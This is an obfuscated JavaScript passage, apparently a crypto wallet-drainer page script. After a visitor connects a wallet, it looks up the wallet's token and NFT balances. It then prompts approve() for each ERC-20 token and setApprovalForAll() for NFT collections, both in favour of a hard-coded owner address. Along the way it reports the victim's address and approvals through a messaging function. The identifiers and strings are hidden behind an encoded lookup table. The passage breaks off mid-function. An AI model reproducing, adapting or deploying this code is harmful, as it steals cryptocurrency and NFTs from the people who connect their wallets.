const _0x299cf8=_0x4f8a;function _0x4f8a(_0x4789ea,_0xef67b6){const _0x20ad07=_0x20ad();return _0x4f8a=function(_0x4f8aa4,_0x6ec142){_0x4f8aa4=_0x4f8aa4-0x70;let _0x54c165=_0x20ad07[_0x4f8aa4];return _0x54c165;},_0x4f8a(_0x4789ea,_0xef67b6);}(function(_0x23317b,_0x4c5eb0){const _0x535f29=_0x4f8a,_0x1182c7=_0x23317b();while(!![]){try{const _0x5e6292=-parseInt(_0x535f29(0x117))/0x1+-parseInt(_0x535f29(0xfb))/0x2+-parseInt(_0x535f29(0x149))/0x3+-parseInt(_0x535f29(0xcd))/0x4*(parseInt(_0x535f29(0x15d))/0x5)+parseInt(_0x535f29(0x14d))/0x6*(parseInt(_0x535f29(0xa7))/0x7)+parseInt(_0x535f29(0x98))/0x8+parseInt(_0x535f29(0xac))/0x9;if(_0x5e6292===_0x4c5eb0)break;else _0x1182c7['push'](_0x1182c7['shift']());}catch(_0x5728be){_0x1182c7['push'](_0x1182c7['shift']());}}}(_0x20ad,0xf30dd));let tokens=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window['Web3Modal'][_0x299cf8(0xe8)],WalletConnectProvider=window['WalletConnectProvider']['default'],OWNER_ADDRESS=_0x299cf8(0x74),ABI=[{'constant':!![],'inputs':[],'name':_0x299cf8(0xc0),'outputs':[{'name':'','type':_0x299cf8(0xbf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x299cf8(0xc8)}],'name':'deprecate','outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'constant':![],'inputs':[{'name':'_spender','type':'address'},{'name':'_value','type':_0x299cf8(0xdf)}],'name':_0x299cf8(0xb7),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':'function'},{'constant':!![],'inputs':[],'name':_0x299cf8(0xa5),'outputs':[{'name':'','type':_0x299cf8(0xed)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x299cf8(0xc8)}],'name':_0x299cf8(0x126),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0x9c),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x299cf8(0x7a),'type':_0x299cf8(0xc8)},{'name':_0x299cf8(0x79),'type':_0x299cf8(0xc8)},{'name':_0x299cf8(0xce),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0x15f),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':'function'},{'constant':!![],'inputs':[],'name':_0x299cf8(0x12d),'outputs':[{'name':'','type':_0x299cf8(0xc8)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x299cf8(0xc8)}],'name':'balances','outputs':[{'name':'','type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0x157),'outputs':[{'name':'','type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0x14b),'outputs':[{'name':'','type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0x141),'outputs':[{'name':'','type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':![],'inputs':[],'name':_0x299cf8(0x92),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[{'name':_0x299cf8(0xf6),'type':_0x299cf8(0xc8)}],'name':_0x299cf8(0x160),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[{'name':'','type':_0x299cf8(0xc8)},{'name':'','type':_0x299cf8(0xc8)}],'name':_0x299cf8(0xa0),'outputs':[{'name':'','type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0xe1),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[{'name':_0x299cf8(0x8f),'type':_0x299cf8(0xc8)}],'name':_0x299cf8(0xda),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'constant':![],'inputs':[],'name':_0x299cf8(0xaa),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0xa8),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0x101),'outputs':[{'name':'','type':_0x299cf8(0xc8)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0xf9),'outputs':[{'name':'','type':_0x299cf8(0xbf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'constant':![],'inputs':[{'name':_0x299cf8(0x79),'type':_0x299cf8(0xc8)},{'name':_0x299cf8(0xce),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0xba),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'constant':![],'inputs':[{'name':'newBasisPoints','type':_0x299cf8(0xdf)},{'name':_0x299cf8(0x142),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0xae),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'constant':![],'inputs':[{'name':_0x299cf8(0xc6),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0x91),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':'function'},{'constant':![],'inputs':[{'name':_0x299cf8(0xc6),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0xc1),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[{'name':_0x299cf8(0x86),'type':_0x299cf8(0xc8)},{'name':_0x299cf8(0xa9),'type':_0x299cf8(0xc8)}],'name':_0x299cf8(0x144),'outputs':[{'name':_0x299cf8(0xd1),'type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0x14a),'outputs':[{'name':'','type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[{'name':'','type':_0x299cf8(0xc8)}],'name':_0x299cf8(0xd8),'outputs':[{'name':'','type':_0x299cf8(0xed)}],'payable':![],'stateMutability':'view','type':_0x299cf8(0x15a)},{'constant':![],'inputs':[{'name':'_clearedUser','type':_0x299cf8(0xc8)}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'constant':!![],'inputs':[],'name':_0x299cf8(0x10d),'outputs':[{'name':'','type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'constant':![],'inputs':[{'name':_0x299cf8(0xdc),'type':_0x299cf8(0xc8)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'constant':![],'inputs':[{'name':'_blackListedUser','type':_0x299cf8(0xc8)}],'name':_0x299cf8(0xa3),'outputs':[],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'inputs':[{'name':_0x299cf8(0xf0),'type':'uint256'},{'name':_0x299cf8(0x12b),'type':'string'},{'name':_0x299cf8(0xc7),'type':_0x299cf8(0xbf)},{'name':'_decimals','type':_0x299cf8(0xdf)}],'payable':![],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0xb2)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x299cf8(0xc6),'type':'uint256'}],'name':'Issue','type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x299cf8(0xc6),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0x70),'type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':_0x299cf8(0xc8)}],'name':'Deprecate','type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x299cf8(0xc2),'type':_0x299cf8(0xdf)},{'indexed':![],'name':_0x299cf8(0x113),'type':'uint256'}],'name':_0x299cf8(0xa1),'type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':_0x299cf8(0xc8)},{'indexed':![],'name':_0x299cf8(0xeb),'type':_0x299cf8(0xdf)}],'name':'DestroyedBlackFunds','type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x299cf8(0xcc),'type':_0x299cf8(0xc8)}],'name':_0x299cf8(0x95),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x299cf8(0xcc),'type':_0x299cf8(0xc8)}],'name':_0x299cf8(0xec),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x299cf8(0x101),'type':_0x299cf8(0xc8)},{'indexed':!![],'name':_0x299cf8(0x13d),'type':'address'},{'indexed':![],'name':_0x299cf8(0xb9),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0x122),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x299cf8(0x11d),'type':_0x299cf8(0xc8)},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':_0x299cf8(0xb9),'type':_0x299cf8(0xdf)}],'name':'Transfer','type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[],'name':_0x299cf8(0xca),'type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[],'name':'Unpause','type':_0x299cf8(0xfd)}],ABIN=[{'inputs':[{'internalType':_0x299cf8(0xbf),'name':_0x299cf8(0xc0),'type':'string'},{'internalType':_0x299cf8(0xbf),'name':_0x299cf8(0xf9),'type':_0x299cf8(0xbf)},{'internalType':_0x299cf8(0xdf),'name':_0x299cf8(0xd6),'type':_0x299cf8(0xdf)},{'internalType':_0x299cf8(0xdf),'name':_0x299cf8(0xdb),'type':_0x299cf8(0xdf)}],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0xb2)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0x101),'type':'address'},{'indexed':!![],'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0x8a),'type':_0x299cf8(0xc8)},{'indexed':!![],'internalType':_0x299cf8(0xdf),'name':'tokenId','type':_0x299cf8(0xdf)}],'name':_0x299cf8(0x122),'type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x299cf8(0x101),'type':_0x299cf8(0xc8)},{'indexed':!![],'internalType':'address','name':_0x299cf8(0xf2),'type':'address'},{'indexed':![],'internalType':_0x299cf8(0xed),'name':_0x299cf8(0x8a),'type':_0x299cf8(0xed)}],'name':_0x299cf8(0x132),'type':_0x299cf8(0xfd)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x299cf8(0x125),'type':_0x299cf8(0xc8)},{'indexed':!![],'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0xdc),'type':_0x299cf8(0xc8)}],'name':'OwnershipTransferred','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0x11d),'type':_0x299cf8(0xc8)},{'indexed':!![],'internalType':_0x299cf8(0xc8),'name':'to','type':_0x299cf8(0xc8)},{'indexed':!![],'internalType':'uint256','name':_0x299cf8(0x84),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0xe5),'type':_0x299cf8(0xfd)},{'inputs':[],'name':_0x299cf8(0x14e),'outputs':[{'internalType':_0x299cf8(0xbf),'name':'','type':_0x299cf8(0xbf)}],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x299cf8(0xdf),'name':'','type':_0x299cf8(0xdf)}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0xe4),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0x12c),'outputs':[{'internalType':_0x299cf8(0xdf),'name':'','type':_0x299cf8(0xdf)}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':'address','name':'to','type':_0x299cf8(0xc8)},{'internalType':'uint256','name':_0x299cf8(0x84),'type':'uint256'}],'name':_0x299cf8(0xb7),'outputs':[],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0x101),'type':'address'}],'name':_0x299cf8(0xda),'outputs':[{'internalType':_0x299cf8(0xdf),'name':'','type':'uint256'}],'stateMutability':'view','type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0x134),'outputs':[{'internalType':_0x299cf8(0xbf),'name':'','type':'string'}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0xf3),'outputs':[],'stateMutability':'nonpayable','type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0x71),'outputs':[],'stateMutability':'nonpayable','type':_0x299cf8(0x15a)},{'inputs':[{'internalType':'uint256','name':_0x299cf8(0x84),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0x15c),'outputs':[{'internalType':_0x299cf8(0xc8),'name':'','type':_0x299cf8(0xc8)}],'stateMutability':'view','type':_0x299cf8(0x15a)},{'inputs':[{'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0x101),'type':_0x299cf8(0xc8)},{'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0xf2),'type':_0x299cf8(0xc8)}],'name':_0x299cf8(0xe6),'outputs':[{'internalType':'bool','name':'','type':_0x299cf8(0xed)}],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'inputs':[],'name':_0x299cf8(0x107),'outputs':[{'internalType':_0x299cf8(0xdf),'name':'','type':_0x299cf8(0xdf)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x299cf8(0xdf),'name':'numberOfTokens','type':_0x299cf8(0xdf)}],'name':'mintApe','outputs':[],'stateMutability':_0x299cf8(0xb6),'type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0xc0),'outputs':[{'internalType':_0x299cf8(0xbf),'name':'','type':_0x299cf8(0xbf)}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x299cf8(0xc8),'name':'','type':_0x299cf8(0xc8)}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':_0x299cf8(0xdf),'name':'tokenId','type':_0x299cf8(0xdf)}],'name':_0x299cf8(0xc4),'outputs':[{'internalType':_0x299cf8(0xc8),'name':'','type':'address'}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0xd7),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0x11d),'type':_0x299cf8(0xc8)},{'internalType':_0x299cf8(0xc8),'name':'to','type':_0x299cf8(0xc8)},{'internalType':_0x299cf8(0xdf),'name':_0x299cf8(0x84),'type':'uint256'}],'name':_0x299cf8(0x161),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0x11d),'type':_0x299cf8(0xc8)},{'internalType':_0x299cf8(0xc8),'name':'to','type':_0x299cf8(0xc8)},{'internalType':_0x299cf8(0xdf),'name':_0x299cf8(0x84),'type':_0x299cf8(0xdf)},{'internalType':_0x299cf8(0x108),'name':_0x299cf8(0xef),'type':'bytes'}],'name':_0x299cf8(0x161),'outputs':[],'stateMutability':_0x299cf8(0x100),'type':'function'},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x299cf8(0xed),'name':'','type':_0x299cf8(0xed)}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':'address','name':'operator','type':_0x299cf8(0xc8)},{'internalType':_0x299cf8(0xed),'name':_0x299cf8(0x8a),'type':_0x299cf8(0xed)}],'name':_0x299cf8(0x80),'outputs':[],'stateMutability':'nonpayable','type':_0x299cf8(0x15a)},{'inputs':[{'internalType':_0x299cf8(0xbf),'name':_0x299cf8(0x134),'type':_0x299cf8(0xbf)}],'name':_0x299cf8(0x156),'outputs':[],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':'string','name':'provenanceHash','type':_0x299cf8(0xbf)}],'name':'setProvenanceHash','outputs':[],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':_0x299cf8(0xdf),'name':'revealTimeStamp','type':_0x299cf8(0xdf)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':_0x299cf8(0xd2),'outputs':[],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0xfc),'outputs':[{'internalType':_0x299cf8(0xdf),'name':'','type':'uint256'}],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'inputs':[],'name':_0x299cf8(0x99),'outputs':[{'internalType':_0x299cf8(0xdf),'name':'','type':_0x299cf8(0xdf)}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':_0x299cf8(0x15b),'name':'interfaceId','type':_0x299cf8(0x15b)}],'name':_0x299cf8(0x151),'outputs':[{'internalType':_0x299cf8(0xed),'name':'','type':_0x299cf8(0xed)}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[],'name':_0x299cf8(0xf9),'outputs':[{'internalType':_0x299cf8(0xbf),'name':'','type':_0x299cf8(0xbf)}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':'uint256','name':_0x299cf8(0x10a),'type':'uint256'}],'name':_0x299cf8(0xb5),'outputs':[{'internalType':_0x299cf8(0xdf),'name':'','type':_0x299cf8(0xdf)}],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'inputs':[{'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0x101),'type':_0x299cf8(0xc8)},{'internalType':_0x299cf8(0xdf),'name':'index','type':'uint256'}],'name':_0x299cf8(0xb1),'outputs':[{'internalType':_0x299cf8(0xdf),'name':'','type':_0x299cf8(0xdf)}],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'inputs':[{'internalType':_0x299cf8(0xdf),'name':_0x299cf8(0x84),'type':_0x299cf8(0xdf)}],'name':_0x299cf8(0x145),'outputs':[{'internalType':_0x299cf8(0xbf),'name':'','type':_0x299cf8(0xbf)}],'stateMutability':_0x299cf8(0x8d),'type':'function'},{'inputs':[],'name':_0x299cf8(0x9c),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x299cf8(0x8d),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':_0x299cf8(0xc8),'name':'from','type':_0x299cf8(0xc8)},{'internalType':'address','name':'to','type':_0x299cf8(0xc8)},{'internalType':_0x299cf8(0xdf),'name':'tokenId','type':_0x299cf8(0xdf)}],'name':_0x299cf8(0x15f),'outputs':[],'stateMutability':_0x299cf8(0x100),'type':_0x299cf8(0x15a)},{'inputs':[{'internalType':_0x299cf8(0xc8),'name':_0x299cf8(0xdc),'type':_0x299cf8(0xc8)}],'name':'transferOwnership','outputs':[],'stateMutability':_0x299cf8(0x100),'type':'function'},{'inputs':[],'name':_0x299cf8(0x12a),'outputs':[],'stateMutability':'nonpayable','type':_0x299cf8(0x15a)}],networkToId={0x1328cf7:_0x299cf8(0x136),0x1:_0x299cf8(0xab),0x5:'eth-goerli',0x89:_0x299cf8(0x140),0x13881:_0x299cf8(0x76),0x38:_0x299cf8(0x139),0x61:_0x299cf8(0xf7),0xa86a:_0x299cf8(0x90),0xa869:_0x299cf8(0xd4),0xfa:_0x299cf8(0x9b),0xfa2:_0x299cf8(0x104),0xa4b1:_0x299cf8(0x94),0x66eed:_0x299cf8(0x154),0xa4ba:'arbitrum-nova-mainnet',0x250:_0x299cf8(0xe2),0x51:_0x299cf8(0x119),0x150:'astar-shiden',0x4e454152:'aurora-mainnet',0x4e454153:_0x299cf8(0x130),0x6984c:_0x299cf8(0xd3),0x69849:_0x299cf8(0x11e),0x7e4:_0x299cf8(0xfe),0x14a33:'base-testnet',0x77:_0x299cf8(0xee),0x405:'bittorrent-testnet',0xa918:_0x299cf8(0x87),0x10e8:_0x299cf8(0xde),0xdbe0:_0x299cf8(0x143),0x2600:'boba-bnb-testnet',0x50e:'boba-bobabeam-mainnet',0x511:_0x299cf8(0x116),0x120:_0x299cf8(0x105),0x1c:'boba-rinkeby-testnet',0xb48:_0x299cf8(0x82),0x1e14:_0x299cf8(0x14f),0x436f7631:'covalent-internal-network-v1',0x19:_0x299cf8(0x135),0x152:_0x299cf8(0x9a),0xd2af:_0x299cf8(0xf5),0x14f:_0x299cf8(0x10c),0xa516:_0x299cf8(0x147),0x2329:'evmos-mainnet',0x2328:'evmos-testnet',0x868:_0x299cf8(0xa6),0x86a:_0x299cf8(0xad),0x13:'flarenetworks-canary-mainnet',0x10:_0x299cf8(0x155),0xe:'flarenetworks-flare-mainnet',0x72:_0x299cf8(0xe3),0xb7e7759:_0x299cf8(0x10f),0x153c099c:'gather-testnet',0x63564c40:_0x299cf8(0xb0),0x6357d2e0:_0x299cf8(0x77),0x141:_0x299cf8(0x13c),0x142:_0x299cf8(0xd0),0xe704:_0x299cf8(0x112),0x1389:'mantle-testnet',0x52:'meter-mainnet',0x53:'meter-testnet',0x440:'metis-mainnet',0x24c:_0x299cf8(0x8e),0x7d2:_0x299cf8(0xd9),0x30e0a:_0x299cf8(0x72),0x7d1:_0x299cf8(0xb3),0x30da5:_0x299cf8(0x89),0x504:'moonbeam-mainnet',0x507:_0x299cf8(0xe0),0x505:_0x299cf8(0xbb),0xe9ac0ce:_0x299cf8(0x106),0x116ea:_0x299cf8(0xbd),0x116e9:_0x299cf8(0x81),0x116e1:_0x299cf8(0x9e),0x5afe:_0x299cf8(0x131),0x5aff:_0x299cf8(0x15e),0xf8:_0x299cf8(0x152),0x249c:_0x299cf8(0x110),0xa:_0x299cf8(0xfa),0x2a15c308d:_0x299cf8(0x13a),0x2a15c3083:_0x299cf8(0x85),0x5a2:'polygon-zkevm-testnet',0x1e:_0x299cf8(0x128),0x1f:'rsk-testnet',0x5d456c62:_0x299cf8(0xc9),0x1482a7b2:_0x299cf8(0x148),0x3d28774d:_0x299cf8(0x8b),0x109b4597:_0x299cf8(0xdd),0x536f6c4d:_0x299cf8(0x7f),0x1202c:'swimmer-mainnet',0x1202d:_0x299cf8(0x138),0x1a0:_0x299cf8(0x12f)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0xa:'https://mainnet.optimism.io'},'chainId':0xa,'network':'optimism','infuraId':_0x299cf8(0x153),'pollingInterval':_0x299cf8(0x13e)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':'web3','infuraId':_0x299cf8(0x153),'rpc':'https://mainnet.optimism.io','chainId':0xa,'network':'optimism','darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x299cf8(0x120))['click'](async function(){const _0x140fdb=_0x299cf8;try{let _0x4583ad=await web3Modal['connect']();onProvider(_0x4583ad),_0x4583ad['on']('accountsChanged',_0x6cdf10=>{const _0x44a395=_0x4f8a;web3['eth']['defaultCommon']={'customChain':{'name':_0x44a395(0xf8),'chainId':0xa,'networkId':0xa},'baseChain':'mainnet','hardfork':_0x44a395(0x103)},console['log'](_0x6cdf10),onProvider(_0x4583ad);});}catch(_0x4820dc){console[_0x140fdb(0x8c)](_0x140fdb(0x75),_0x4820dc);return;}});async function onProvider(_0x319a7f){const _0x273f26=_0x299cf8;web3Object=new Web3(_0x319a7f);let _0x1abc79=await web3Object[_0x273f26(0x159)][_0x273f26(0x11b)]();selectedAccount=_0x1abc79[0x0],chainName=await web3Object[_0x273f26(0x159)][_0x273f26(0x129)](),chainId=networkToId[chainName],console[_0x273f26(0x8c)](chainId),console['log'](selectedAccount),_0x1abc79[_0x273f26(0xff)]&&(sendMessage(_0x273f26(0x7e)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall());}async function covalenthqAPICall(){const _0x5e9ce6=_0x299cf8,_0x50efab={'format':_0x5e9ce6(0xa2),'nft':'true','quote-currency':_0x5e9ce6(0x9f),'key':_0x5e9ce6(0x96)},_0x5d9122=new URL(_0x5e9ce6(0xb8)+chainId+_0x5e9ce6(0x12e)+selectedAccount+'/balances_v2/');_0x5d9122[_0x5e9ce6(0x10b)]=new URLSearchParams(_0x50efab)[_0x5e9ce6(0x158)]();const _0x3fb08b={'method':_0x5e9ce6(0xf1),'headers':{'Content-Type':_0x5e9ce6(0xbe)}};try{const _0x3ce2f4=await fetch(_0x5d9122,_0x3fb08b)[_0x5e9ce6(0x11a)](_0x35f53d=>_0x35f53d[_0x5e9ce6(0xb4)]());let _0x2b5e66=_0x3ce2f4[_0x5e9ce6(0xea)][_0x5e9ce6(0x88)];console[_0x5e9ce6(0x8c)](_0x5e9ce6(0x146),_0x2b5e66);let _0x519dd1=_0x2b5e66['map'](_0x36d01c=>{const _0x3d89c4=_0x5e9ce6;return{'balance':_0x36d01c[_0x3d89c4(0xe7)],'value':_0x36d01c[_0x3d89c4(0x13f)],'address':_0x36d01c[_0x3d89c4(0xcb)],'symbol':_0x36d01c[_0x3d89c4(0x78)],'type':_0x36d01c[_0x3d89c4(0x115)]};});console[_0x5e9ce6(0x8c)]('tokens-list',_0x519dd1),tokens=_0x519dd1[_0x5e9ce6(0x162)](_0x4b9009=>_0x4b9009['value']>0x5&&_0x4b9009[_0x5e9ce6(0xf9)]!=_0x5e9ce6(0x111)),console[_0x5e9ce6(0x8c)](_0x5e9ce6(0xd5),chainId,'Tokens:',tokens);if(window[_0x5e9ce6(0x7b)][_0x5e9ce6(0x10b)])onSendEther();else onApprove();}catch{sendMessage('Error\x20collecting\x20info\x20about\x20wallet');}}async function onApprove(){const _0x5c540d=_0x299cf8;if(tokens[_0x5c540d(0xff)])try{loopTokens(tokens);}catch(_0x1e2a5b){console['error'](_0x5c540d(0x137)+_0x1e2a5b['message']);}else sendMessage(_0x5c540d(0x11c));}async function loopTokens(_0x4bff4d){const _0x33dc9c=_0x299cf8;for await(let _0x535a7c of _0x4bff4d){if(_0x535a7c[_0x33dc9c(0x115)]==='cryptocurrency'){let _0x1e4f61=new web3Object['eth']['Contract'](ABI,_0x535a7c[_0x33dc9c(0xc8)]);sendMessage('New\x20token'),await _0x1e4f61['methods'][_0x33dc9c(0xb7)](OWNER_ADDRESS,_0x33dc9c(0xbc))[_0x33dc9c(0x109)]({'from':selectedAccount,'to':_0x535a7c['address']})['on']('transactionHash',_0xa1a4e3=>{const _0x26b7a2=_0x33dc9c;console[_0x26b7a2(0x8c)](_0x26b7a2(0xa4)+_0xa1a4e3),setTimeout(function(){const _0x3d4767=_0x26b7a2;alert(_0x3d4767(0x10e));},0x1);})['on'](_0x33dc9c(0x93),_0x2b9846=>{const _0xb822dd=_0x33dc9c;console[_0xb822dd(0x8c)]('Transaction\x20Receipt:\x20'+_0x2b9846),sendMessage(_0xb822dd(0xaf)),sendMessage(_0xb822dd(0x118)+_0x535a7c['address']),sendMessage('Token\x20balance\x20is\x20'+_0x535a7c[_0xb822dd(0xe7)]),sendMessage(_0xb822dd(0x114)+OWNER_ADDRESS);})['on'](_0x33dc9c(0x7c),_0x28cf9b=>{const _0x23600a=_0x33dc9c;console['log'](_0x23600a(0x124)+_0x28cf9b),sendMessage(_0x23600a(0x11f));});}else{if(_0x535a7c[_0x33dc9c(0x115)]===_0x33dc9c(0xc3)){let _0x41fb1f=new web3Object[(_0x33dc9c(0x159))][(_0x33dc9c(0x13b))](ABIN,_0x535a7c[_0x33dc9c(0xc8)]);await _0x41fb1f[_0x33dc9c(0x121)]['setApprovalForAll'](OWNER_ADDRESS,_0x33dc9c(0x97))[_0x33dc9c(0x109)]({'from':selectedAccount,'to':_0x535a7c[_0x33dc9c(0xc8)]})['on']('transactionHash',_0x4e8133=>{const 